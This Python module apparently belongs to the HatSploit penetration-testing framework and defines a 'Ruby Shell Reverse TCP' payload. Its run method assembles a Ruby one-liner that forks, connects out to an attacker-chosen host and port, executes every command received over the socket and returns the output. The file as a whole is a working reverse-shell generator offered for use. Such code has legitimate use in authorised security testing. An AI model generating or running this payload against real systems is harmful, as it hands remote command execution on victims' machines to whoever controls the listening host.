#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.payload import Payload
from hatsploit.utils.tcp import TCPClient


class HatSploitPayload(Payload, TCPClient):
    details = {
        'Category': "single",
        'Name': "Ruby Shell Reverse TCP",
        'Payload': "unix/generic/ruby_reverse_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080)'
        ],
        'Description': "Ruby shell reverse TCP payload.",
        'Comments': [
            ''
        ],
        'Architecture': "generic",
        'Platform': "unix",
        'Risk': "high",
        'Type': "reverse_tcp"
    }

    options = {
        'LHOST': {
            'Description': "Local host.",
            'Value': TCPClient.get_local_host(),
            'Type': "ip",
            'Required': True
        },
        'LPORT': {
            'Description': "Local port.",
            'Value': 8888,
            'Type': "port",
            'Required': True
        }
    }

    def run(self):
        local_host, local_port = self.parse_options(self.options)

        self.output_process("Generating payload...")
        payload = "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"" + local_host + "\",\"" + local_port + "\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"

        return payload
